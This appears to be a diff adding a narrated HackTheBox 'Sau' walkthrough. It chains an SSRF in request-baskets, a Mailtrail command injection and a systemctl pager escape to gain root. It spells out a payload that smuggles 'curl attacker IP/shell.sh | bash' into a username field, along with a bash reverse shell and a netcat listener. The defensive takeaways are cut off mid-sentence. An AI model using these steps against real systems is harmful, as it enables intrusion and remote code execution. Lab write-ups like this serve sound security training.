@@ -1,0 +1,25 @@
+Hey everyone, welcome back. Today we're breaking down Sau, an easy-rated Linux box from HackTheBox. This is a great example of how three individually moderate weaknesses chain together into full system compromise. Let's get into it.
+
+So, kicking off with recon. We run a full port Nmap scan, nmap dash sC dash sV dash p dash against the target. Three ports come back interesting. Port 22, OpenSSH 8.2p1, nothing exciting there. Port 80, HTTP, but it's showing as filtered. That immediately catches the eye because filtered usually means something is listening but a firewall or a localhost bind is blocking external access. And then port 55555, which is running a Golang based HTTP server identified as request-baskets version 1.2.1.
+
+So we browse to port 55555 and we see this request-baskets application. If you're not familiar, it's an open source tool that creates temporary HTTP endpoints, captures incoming requests, useful for webhook debugging and that kind of thing. Now, version 1.2.1 is vulnerable to CVE-2023-27163, which is a Server-Side Request Forgery vulnerability. The issue is that when you create a basket, you can configure a forward URL and enable proxy response, and the server will happily make requests to arbitrary internal addresses on your behalf and return the response to you. That filtered port 80 just became very interesting.
+
+So here's step one of the exploitation. We create a new basket through the web UI on port 55555. We set the forward URL to http 127.0.0.1 colon 80 and we toggle proxy response to true. Now when we hit the basket URL, we're transparently proxying through to whatever is running on localhost port 80. And what do we find? Mailtrail version 0.53.
+
+Step two. Mailtrail 0.53 has an unauthenticated OS command injection vulnerability in the username parameter of its login form. The value gets passed unsanitized directly into a shell command on the server. Classic.
+
+Here's how we exploit it. On our attacker machine, we create a simple bash reverse shell script, shell.sh, with bash dash i redirecting to our IP on port 9001. We serve that file with python3 dash m http.server on port 8000. We start a netcat listener, nc dash lvnp 9001. Then we fire the payload through our SSRF basket. We curl the basket URL slash login, and in the POST data we set username equals semicolon curl http attacker IP colon 8000 slash shell.sh pipe bash. The semicolon breaks out of the original command context, curl downloads our script, and bash executes it.
+
+Shell lands. We're in as the user puma, and we grab user.txt.
+
+Now, privilege escalation. First thing we do as puma is run sudo dash l. And we see that puma can run, with no password, sudo slash usr slash bin slash systemctl status trail.service. That's it. Looks harmless, right? It's just viewing a service status. But here's the thing. When systemctl status produces output longer than your terminal height, it invokes a pager, typically less. And because we're running this through sudo, that pager inherits the root context. And less lets you spawn a shell by typing exclamation mark sh.
+
+So we run sudo systemctl status trail.service, the output drops us into less running as root, we type bang sh, and we have a root shell. Grab root.txt, box is done.
+
+This technique is well documented on GTFOBins under the systemctl entry, and it's one of those things that catches people off guard because the sudo rule looks so restrictive on the surface.
+
+So let's talk takeaways. First, SSRF is not low impact. A seemingly minor SSRF in request-baskets turned a filtered, unreachable internal service into a fully accessible attack surface. Network-level filtering is not a sufficient control when an SSRF vector exists on the same host.
+
+Second, patch your third-party components. Both request-baskets 1.2.1 and Mailtrail 0.53 had public CVEs with exploit code readily available. Updating either one breaks the kill chain entirely.
+
+Third, be extremely careful with sudo rules involving commands that invoke pagers. Systemctl status, journalctl, man, anything that drops into less or more. If you must allow it, set the LESSSECURE environment variable to 1 or replace the p
